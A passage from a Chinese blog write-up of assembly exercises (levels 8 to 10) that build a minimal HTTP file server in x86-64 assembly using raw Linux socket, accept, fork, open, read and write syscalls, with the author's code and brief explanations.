class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><br></code></pre></td></tr></table></figure><h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>这一关就是加一个accept调用即可。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">4</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_RDONLY)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">5</span>              # read(the_file,buf,<span class="hljs-number">256</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">5</span>      # close(<span class="hljs-number">5</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;file_buf&quot;</span>, <span class="hljs-built_in">r8</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><br></code></pre></td></tr></table></figure><h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>这道题要用fork，经过第七题的拷打之后，简单一些了。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # fork()<br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> child_process<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">child_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">4</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_RDONLY)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>              # read(the_file,buf,<span class="hljs-number">256</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">5</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;file_buf&quot;</span>, <span class="hljs-built_in">r8</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">done:</span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><br></code></pre></td></tr></table></figure><h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h4><p>这一关，还挺折磨的。对于客户端发来的信息：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-string">&quot;POST /tmp/tmpgjb407yq HTTP/1.1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Host: localhost<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>User-Agent: python-requests/2.32.3<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Accept-Encoding: gzip, deflate, zstd<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Accept: */*<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection: keep-alive<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length: 65<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>K8rWGbWjWUycQmhKDinJRKVnmTd1ssEfnNbxuzygIK4l1pIVgCGgSx0Kdr3xqIFWK&quot;</span><br></code></pre></td></tr></table></figure><p>需要解析出length和这个随机字符串。因为后续需要通过write写入文件<code>/tmp/xxx</code>。所以，我想到的方法是将这个字符串存入buffer，然后从buffer的最后一个字节开始逆序遍历，到第一个<code>\n</code>停止。这样可以拿到这个随机字符串的逆序，以及用一个寄存器记录一下长度。后续再通过这个长度来再一次逆序这个随机字符串，从而写入<code>/tmp/xxx</code>。最终代码如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 